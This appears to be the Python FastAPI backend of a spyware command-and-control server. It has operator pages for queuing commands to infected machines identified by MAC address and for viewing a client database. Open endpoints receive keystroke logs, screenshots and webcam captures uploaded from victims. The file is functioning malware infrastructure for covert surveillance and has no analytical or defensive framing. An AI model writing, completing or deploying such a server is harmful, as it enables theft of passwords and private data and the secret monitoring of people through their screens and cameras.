import uvicorn
import os
from fastapi import FastAPI, Request, Form, Depends
from fastapi.responses import HTMLResponse
from typing import Dict, List
from security import get_current_username
from db_utils import load_db, write_db
from handle_clients import handle_command_request, handle_first_command, upload_file

app = FastAPI()


@app.get('/')
async def root(username: str = Depends(get_current_username)):
    with open('source_files/index.html', 'r') as file:
        return HTMLResponse(file.read())


@app.get('/add_commands.html')
async def add_commands_html(username: str = Depends(get_current_username)):
    with open('source_files/add_commands.html', 'r') as file:
        return HTMLResponse(file.read())


@app.get('/view_clients.html')
async def root(username: str = Depends(get_current_username)):
    with open('source_files/view_clients.html', 'r') as file:
        return HTMLResponse(file.read())


@app.get('/db.json')
async def db_json(username: str = Depends(get_current_username)):
    return load_db()


@app.post('/add_command')
async def add_command(username: str = Depends(get_current_username),
                      mac_address: str = Form(default=None),
                      commands: str = Form(default="")):
    db = load_db()
    db[mac_address]['commands'] += commands.split(',')
    write_db(db)
    with open('source_files/commands_added.html', 'r') as file:
        return HTMLResponse(file.read())


@app.get('/first_command')
async def first_command(request: Request) -> Dict[str, List[str]]:
    return handle_first_command(request)


@app.get('/command')
async def command(request: Request) -> Dict[str, List[str]]:
    return handle_command_request(request)


@app.post('/keylog_data')
async def keylog(request: Request) -> None:
    await upload_file(request, 'log', 'keylogs_received', 'txt', True)


@app.post('/screenshot')
async def screenshot(request: Request) -> None:
    file_type = request.headers['Content-Type'].split('/')[1]
    await upload_file(request, 'screenshot', 'screenshots_taken', file_type, False)


@app.post('/webcam_capture')
async def webcam_capture(request: Request) -> None:
    file_type = request.headers['Content-Type'].split('/')[1]
    await upload_file(request, 'webcam', 'webcam_shots_taken', file_type, False)


if __name__ == '__main__':
    uvicorn.run('main:app', host='0.0.0.0', port=int(os.environ.get("PORT", 30050)), workers=2, debug=True)
# uvicorn main:app --reload
